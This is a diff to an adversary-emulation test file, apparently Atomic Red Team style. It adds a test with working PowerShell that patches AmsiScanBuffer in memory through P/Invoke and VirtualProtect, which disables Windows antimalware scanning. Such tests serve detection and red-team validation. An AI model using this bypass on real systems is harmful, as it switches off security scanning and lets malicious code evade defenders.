@@ -1737,3 +1737,40 @@ atomic_tests:
         -PolicyStore ActiveStore
     cleanup_command: |-
       Get-NetQosPolicy -PolicyStore ActiveStore | Where-Object { $_.Name -like "*#{net_qos_policy_name}*" } | Remove-NetQosPolicy -Confirm:$false
+- name: AMSI Bypass - Patching AmsiScanBuffer
+  description: |
+    Patches AmsiScanBuffer in memory using P/Invoke to resolve the function address via
+    GetModuleHandle/GetProcAddress, then overwrites the prologue with instructions that
+    return AMSI_RESULT_CLEAN immediately (mov al, 1; ret).
+
+    Reference: https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Add-Type -MemberDefinition @'
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+      '@ -Name "Win32" -Namespace "AMSI"
+
+      $hAmsi = [AMSI.Win32]::GetModuleHandle("amsi.dll")
+      $addr = [AMSI.Win32]::GetProcAddress($hAmsi, "AmsiScanBuffer")
+
+      $oldProtect = 0
+      if ([IntPtr]::Size -eq 8) {
+        $patch = [byte[]]@(0xB0, 0x01, 0xC3)
+      } else {
+        $patch = [byte[]]@(0xB0, 0x01, 0xC2, 0x18, 0x00)
+      }
+
+      [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect) | Out-Null
+      [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
+      [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect) | Out-Null
